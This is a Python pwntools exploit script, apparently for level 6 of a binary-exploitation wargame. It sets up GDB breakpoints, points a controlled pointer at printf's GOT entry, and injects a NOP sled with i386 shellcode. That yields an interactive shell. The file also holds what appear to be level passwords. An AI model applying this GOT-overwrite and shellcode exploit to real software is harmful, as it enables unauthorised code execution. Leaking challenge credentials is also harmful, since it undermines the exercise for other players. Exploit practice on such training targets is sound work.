from lib.exploit import *


gdb_script = '''
set disassembly-flavor intel   
alias gil = disassemble

def show_ret
x/2wx $ebp
end

def show_args
x/3wx $esp
end

def nextt
si
finish
end

# find env vars
def show_stack
x/20wx $ebp
end

unset env
show env


def table_adr
x $ebp-0x30
end

# first strtlong input
shell echo "input"
b *0x08048530

# second strtlong
shell echo "pos"
b *0x08048548

# malloc
b *0x080484fd

# strcpy
b *0x08048584

# overwrite got
b *0x08048573

# on nopslide
# b *0x0805000b


r `cat pos` `cat input` `cat payload`

'''

LEVEL = "6"

def prepare_env(s):
    s.process(["rm", "-rf", CWD]).recvall()
    s.process(["mkdir", CWD]).recvall()
    upload(s, gdb_script, CWD + "gdb.script")


# s = connect_to_local(LEVEL, "woucaejiek", remote=False)
s = connect(LEVEL, "eiluquieth")
from lib.exploit import *

prepare_env(s)

printf_got = 0x80498c0

pos = str(0xffffffff)
log.info(f"pos: {pos}")
upload(s, pos, CWD+"pos")

# modify p to point to printf got
input = hex(printf_got).replace("0x", "")    # input = "80498c0"
log.info(f"input: {input}")
upload(s, input, CWD+"input")

payload = pack(printf_got+4, 32)
payload += b"\x90"*0x10
payload += asm(pwnlib.shellcraft.i386.sh())

log.info(f"payload: {payload}")
upload(s, payload, CWD+"payload")

io = s.process(["env", "-i", BINARY_PATH, pos, input, payload])
io.interactive()


# totiquegae
